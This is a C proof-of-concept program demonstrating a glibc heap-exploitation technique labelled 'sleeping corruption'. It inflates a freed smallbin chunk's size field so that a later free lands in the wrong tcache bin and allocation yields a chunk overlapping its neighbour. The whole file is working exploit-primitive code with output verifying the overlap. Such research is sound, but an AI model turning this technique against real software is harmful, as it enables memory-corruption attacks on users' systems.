/*
 * after-free-smallbin-tcache.c -- Extending free chunks, sleeping corruption, smallbin + wrong-tcache variant
 *
 * Corrupt SIZE in smallbin -> retrieve from smallbin -> free to wrong tcache.
 *
 * Mechanism:
 *   1. Allocate fillers + p1 | p2(0x30) | p3(0x80) | guard (contiguous)
 *   2. Free fillers -> tcache[0x30] full (16 entries)
 *   3. free(p2) -> tcache full -> arena -> smallbin[0x30]
 *   4. Corrupt: inflate p2 SIZE to 0x91 while in smallbin
 *   5. Drain tcache[0x30] -> 17th malloc(0x28) -> smallbin exact-fit -> p2
 *      Smallbin retrieval preserves the inflated SIZE (no set_head).
 *   6. free(p2) -> chunksize=0x90 -> tc_idx for 0x90.
 *      tcache[0x90] was NEVER filled -> 0 entries -> tcache_put succeeds!
 *      No arena path -> no _int_free_merge_chunk -> no fake nextchunk needed.
 *   7. malloc(0x88) -> tcache[0x90] -> p2 -> overlaps p3.
 *
 * Key insight: The second free lands in tcache.
 *
 * Build (G=./glibc/build/install):
 *   gcc -g -o poc poc.c -Wl,-rpath,$G/lib -Wl,--dynamic-linker=$G/lib/ld-linux-aarch64.so.1
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define TC 16

int main(void) {
    printf("\nSleeping corruption --- smallbin + tcache (glibc 2.43)\n\n");

    /* Sizes: orig=0x28->chunk 0x30, inflated=0x91->chunk 0x90, target=0x78->chunk 0x80 */
    #define ORIG_SZ  0x28u
    #define INFL_REQ 0x88u
    #define TGT_REQ  0x78u

    /* Fillers */
    void *f[TC];
    for (int i = 0; i < TC; i++) f[i] = malloc(ORIG_SZ);

    void *p1 = malloc(0x18);
    void *p2 = malloc(ORIG_SZ);
    void *p3 = malloc(TGT_REQ);
    void *g  = malloc(0x18);
    printf("p1=%p p2=%p p3=%p guard=%p\n", p1, p2, p3, g);

    /*  Free fillers -> tcache[0x30] full  */
    for (int i = 0; i < TC; i++) free(f[i]);
    printf("[1] tcache[0x30] filled (%d)\n", TC);

    /*  free(p2) -> arena -> smallbin[0x30]  */
    free(p2);
    printf("[2] free(p2) -> smallbin[0x30]\n");

    /*  Sleeping corruption: inflate SIZE in smallbin  */
    size_t *psz = (size_t*)((char*)p2 - 8);
    printf("[3] Corrupt SIZE: 0x%zx -> 0x91\n", *psz);
    *psz = 0x91;

    /*  Drain, then retrieve from smallbin  */
    for (int i = 0; i < TC; i++) f[i] = malloc(ORIG_SZ);
    void *ret = malloc(ORIG_SZ);
    printf("[4] malloc(0x%x) -> %p  %s  SIZE=0x%zx\n",
           ORIG_SZ, ret, ret == p2 ? "OK!" : "NOPE!", *psz);

    /*  free again -> tcache[0x90] (never filled -> room)  */
    free(ret);
    printf("[5] free(p2) -> tcache[0x90] (0 entries -> room)\n");

    /*  malloc from wrong tcache bin -> overlap  */
    void *over = malloc(INFL_REQ);
    printf("[6] malloc(0x%x) -> %p  %s\n", INFL_REQ, over, over == p2 ? "OK!" : "NOPE!");

    /*  Prove overlap  */
    memset(p3, 0xBB, TGT_REQ);
    memset(over, 0x43, INFL_REQ);
    printf("[7] p3[0]=0x%016lx  %s\n",
           *(uint64_t*)p3,
           *(uint64_t*)p3 == 0x4343434343434343ULL
               ? "OK! OVERLAP!" : "NOPE!");

    free(over); free(p1); free(g);
    for (int i = 0; i < TC; i++) free(f[i]);
    printf("[+] Done!\n");
    return 0;
}
